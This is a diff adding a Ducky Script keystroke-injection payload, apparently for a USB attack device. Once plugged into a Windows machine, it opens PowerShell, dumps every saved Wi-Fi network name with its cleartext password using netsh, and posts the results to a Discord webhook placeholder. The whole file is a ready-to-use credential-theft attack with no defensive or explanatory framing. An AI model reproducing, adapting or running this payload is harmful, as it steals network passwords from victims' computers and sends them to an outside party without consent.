@@ -1,0 +1,23 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+STRING [String]$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace '    All User Profile     : ', '' } | ForEach-Object {netsh wlan show profiles name=$_ key=clear} | Select-String "SSID name", "Key Content"
+ENTER
+DELAY 400
+STRING $Body = @{ 
+ENTER
+DELAY 300
+STRING 'username'= 'wifi_creds'
+ENTER
+DELAY 200
+STRING 'content' = $profiles }
+ENTER
+DELAY 500
+STRING iwr -Uri "YOUR_DISCORD_WEBHOOK_URL_HERE" -Method POST -Body $Body
+DELAY 500
+ENTER
+STRING exit
+DELAY 200
+ENTER
